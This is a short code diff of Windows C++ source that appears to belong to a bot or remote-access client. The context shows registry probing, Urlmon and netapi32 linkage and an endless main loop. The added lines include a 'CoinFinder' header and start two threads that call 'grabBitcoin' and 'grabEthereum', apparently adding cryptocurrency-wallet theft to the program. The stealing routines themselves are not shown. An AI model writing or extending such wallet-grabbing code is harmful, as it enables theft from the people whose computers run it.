@@ -12,6 +12,7 @@
 #include <wbemidl.h>
 #include "config.h"
 #include <conio.h>
+#include "CoinFinder.h"
 #include <atlbase.h>
 #pragma comment( lib, "Urlmon.lib" )
 #pragma comment(lib, "netapi32.lib")
@@ -419,6 +420,8 @@ int main(int argc, char *argv[]) {
 	std::string netFramework35 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.5");
 	std::string netFramework4 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v4");
 
+	std::thread t1(&CoinFinder::grabBitcoin, CoinFinder());
+	std::thread t2(&CoinFinder::grabEthereum, CoinFinder());
 
 	while (true) {
 		try {
